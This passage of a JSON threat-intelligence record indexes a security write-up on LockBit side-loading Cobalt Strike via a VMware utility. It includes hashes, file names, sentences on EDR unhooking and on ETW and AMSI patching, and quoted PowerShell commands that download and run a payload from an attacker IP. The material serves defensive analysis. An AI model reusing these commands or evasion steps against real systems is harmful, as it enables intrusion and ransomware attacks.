                        "LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules images on disk."
                    ],
                    "titles": [
                        "Bypassing EDR/EPP Userland Hooks"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x4d7c2ea1>",
                    "type": "UnknownWord",
                    "value": "juncture"
                },
                "references": {
                    "sentences": [
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd9185584>",
                    "type": "UnknownWord",
                    "value": "byte-to-byte"
                },
                "references": {
                    "sentences": [
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x4d344810>",
                    "type": "UnknownWord",
                    "value": "discrepancies"
                },
                "references": {
                    "sentences": [
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.",
                        "Checking for discrepancies between on-disk and in-memory for each loaded module"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x653dddfa>",
                    "type": "UnknownWord",
                    "value": "self"
                },
                "references": {
                    "sentences": [
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x55d7f2fc>",
                    "type": "UnknownWord",
                    "value": "overwriting"
                },
                "references": {
                    "sentences": [
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x9cd2b4d9>",
                    "type": "UnknownWord",
                    "value": "unhooked"
                },
                "references": {
                    "sentences": [
                        "This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules images on disk."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbd76d9c5>",
                    "type": "UnknownWord",
                    "value": "on-disk"
                },
                "references": {
                    "sentences": [
                        "Checking for discrepancies between on-disk and in-memory for each loaded module"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8118c724>",
                    "type": "UnknownWord",
                    "value": "in-memory"
                },
                "references": {
                    "sentences": [
                        "Checking for discrepancies between on-disk and in-memory for each loaded module"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x642c5d03>",
                    "type": "UnknownWord",
                    "value": "subroutine"
                },
                "references": {
                    "sentences": [
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd24f890b>",
                    "type": "UnknownWord",
                    "value": "trampoline"
                },
                "references": {
                    "sentences": [
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x93745d7c>",
                    "type": "UnknownWord",
                    "value": "syscall"
                },
                "references": {
                    "sentences": [
                        "Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.",
                        "EDR-hooked SYSCALL stub that will be patched",
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x9926f622>",
                    "type": "UnknownWord",
                    "value": "stub"
                },
                "references": {
                    "sentences": [
                        "Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.",
                        "EDR-hooked SYSCALL stub that will be patched",
                        "Tail jump at the end of the UPX unpacking stub",
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xac8b186b>",
                    "type": "UnknownWord",
                    "value": "reside"
                },
                "references": {
                    "sentences": [
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5181fa12>",
                    "type": "UnknownWord",
                    "value": "restored"
                },
                "references": {
                    "sentences": [
                        "NT layer hook removed and original code restored",
                        "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb961c15e>",
                    "type": "UnknownWord",
                    "value": "edr-hooked"
                },
                "references": {
                    "sentences": [
                        "EDR-hooked SYSCALL stub that will be patched"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbe58df53>",
                    "type": "UnknownWord",
                    "value": "restore"
                },
                "references": {
                    "sentences": [
                        "Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xec81bfe2>",
                    "type": "UnknownWord",
                    "value": "commences"
                },
                "references": {
                    "sentences": [
                        "The RC4 decryption of the payload then commences.",
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x2ff142be>",
                    "type": "UnknownWord",
                    "value": "etweventwrite"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7a86d374>",
                    "type": "UnknownWord",
                    "value": "winapi"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6ced59b3>",
                    "type": "UnknownWord",
                    "value": "ret"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x22bf527d>",
                    "type": "UnknownWord",
                    "value": "etw-related"
                },
                "references": {
                    "sentences": [
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc0eeb869>",
                    "type": "UnknownWord",
                    "value": "amsiscanbuffer"
                },
                "references": {
                    "sentences": [
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x40f114>",
                    "type": "UnknownWord",
                    "value": "halts"
                },
                "references": {
                    "sentences": [
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa3f46e0b>",
                    "type": "UnknownWord",
                    "value": "inspecting"
                },
                "references": {
                    "sentences": [
                        "AMSI is bypassed the same way as ETW through patching AmsiScanBuffer. This halts AMSI from inspecting potentially suspicious buffers within this process."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb92c2b8f>",
                    "type": "UnknownWord",
                    "value": "rc4-encrypted"
                },
                "references": {
                    "sentences": [
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xb92c2b8f>",
                            "type": "UnknownWord",
                            "value": "rc4-encrypted"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb4b4072b>",
                    "type": "UnknownWord",
                    "value": "yho2sm-"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x886469df>",
                    "type": "UnknownWord",
                    "value": "xsy6sv"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa07cf5de>",
                    "type": "UnknownWord",
                    "value": "f2waed>>"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc18b95ef>",
                    "type": "UnknownWord",
                    "value": "g9i"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5f5f8549>",
                    "type": "UnknownWord",
                    "value": "a-g"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe1a3d204>",
                    "type": "UnknownWord",
                    "value": "herip"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc16b13e4>",
                    "type": "UnknownWord",
                    "value": "wn8"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6045c9d7>",
                    "type": "UnknownWord",
                    "value": "3y>xcwnpol89>"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x18fbfef9>",
                    "type": "UnknownWord",
                    "value": "nu w yt"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x1cd9d27f>",
                    "type": "UnknownWord",
                    "value": "4cp8m-"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf372ccb1>",
                    "type": "UnknownWord",
                    "value": "r->-1"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6ce7ef46>",
                    "type": "UnknownWord",
                    "value": "yt<j"
                },
                "references": {
                    "sentences": [
                        "&.5 \\C3%YHO2SM-&B3!XSY6SV)6(&7;(3.'<crlf>$F2WAED>>;K]8\\*D#?G9I+V@(R,+]A-G\\D<crlf>HERIP:45:X(WN8[?3Y>XCWNPOL89>[.# Q'<crlf>4CP8M-%4N[7.$R->-1)$!NU\"W$!YT<J$V["
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa8f43283>",
                    "type": "UnknownWord",
                    "value": "beacons"
                },
                "references": {
                    "sentences": [
                        "The final result is Beacons Reflective Loader, seen below with the familiar magic bytes and hardcoded strings."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xb7f5b2b5>",
                    "type": "UnknownWord",
                    "value": "resides"
                },
                "references": {
                    "sentences": [
                        "Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbef36b76>",
                    "type": "UnknownWord",
                    "value": "page_execute_readwrite"
                },
                "references": {
                    "sentences": [
                        "Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xabba1bb9>",
                    "type": "UnknownWord",
                    "value": "queue"
                },
                "references": {
                    "sentences": [
                        "Logic to queue and execute user-mode APC",
                        "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x4d0fb6>",
                    "type": "UnknownWord",
                    "value": "resumed"
                },
                "references": {
                    "sentences": [
                        "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xedd6f487>",
                    "type": "UnknownWord",
                    "value": "accessed"
                },
                "references": {
                    "sentences": [
                        "The vmtools.ini file being accessed by a variant"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xedd6f487>",
                            "type": "UnknownWord",
                            "value": "accessed"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xea1f5834>",
                    "type": "UnknownWord",
                    "value": "packed"
                },
                "references": {
                    "sentences": [
                        "Another variant shares the same file name to load vmtools.ini, yet is packed with a custom version of UPX."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xea1f5834>",
                            "type": "UnknownWord",
                            "value": "packed"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe19018ce>",
                    "type": "UnknownWord",
                    "value": "tail"
                },
                "references": {
                    "sentences": [
                        "Tail jump at the end of the UPX unpacking stub"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x72524b90>",
                    "type": "UnknownWord",
                    "value": "unpacking"
                },
                "references": {
                    "sentences": [
                        "Tail jump at the end of the UPX unpacking stub"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x58155ba7>",
                    "type": "UnknownWord",
                    "value": "engagement"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x58155ba7>",
                            "type": "UnknownWord",
                            "value": "engagement"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5baea030>",
                    "type": "UnknownWord",
                    "value": "innovating"
                },
                "references": {
                    "sentences": [
                        "LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                    "type": "UnknownWord",
                    "value": "upx-packed"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x4a786c58>",
                    "type": "UnknownWord",
                    "value": "mitre att"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x175337a7>",
                    "type": "UnknownWord",
                    "value": "unhooking"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x751ee140>",
                    "type": "UnknownWord",
                    "value": "s0154"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            }
        ]
    },
    "other_links": [],
    "info": {
        "potential_threats": {
            "<UNKNOWNWORD_0x9f7ebcc6>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x9f7ebcc6>",
                    "type": "UnknownWord",
                    "value": "side-loads"
                },
                "references": {
                    "sentences": [
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": [
                        "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility"
                    ]
                }
            },
            "<UNKNOWNWORD_0xe51d6fb0>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xe51d6fb0>",
                    "type": "UnknownWord",
                    "value": "haughom"
                },
                "references": {
                    "sentences": [
                        "James Haughom"
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x27310be>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x27310be>",
                    "type": "UnknownWord",
                    "value": "antimalware"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xc9d21476>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xc9d21476>",
                    "type": "UnknownWord",
                    "value": "winscp"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xd03ce4c1>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xd03ce4c1>",
                    "type": "UnknownWord",
                    "value": "dll-hijacking"
                },
                "references": {
                    "sentences": [
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xfe4a4d24>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xfe4a4d24>",
                    "type": "UnknownWord",
                    "value": "beacon"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0x3006330>": {
                "token": {
                    "id": "<UNKNOWNWORD_0x3006330>",
                    "type": "UnknownWord",
                    "value": "vmwarexferlogs"
                },
                "references": {
                    "sentences": [
                        "The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a .log file."
                    ],
                    "titles": []
                }
            },
            "<UNKNOWNWORD_0xaf6c5d4a>": {
                "token": {
                    "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                    "type": "UnknownWord",
                    "value": "-outfile"
                },
                "references": {
                    "sentences": [
                        "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xaf6c5d4a>",
                            "type": "UnknownWord",
                            "value": "-outfile"
                        }
                    },
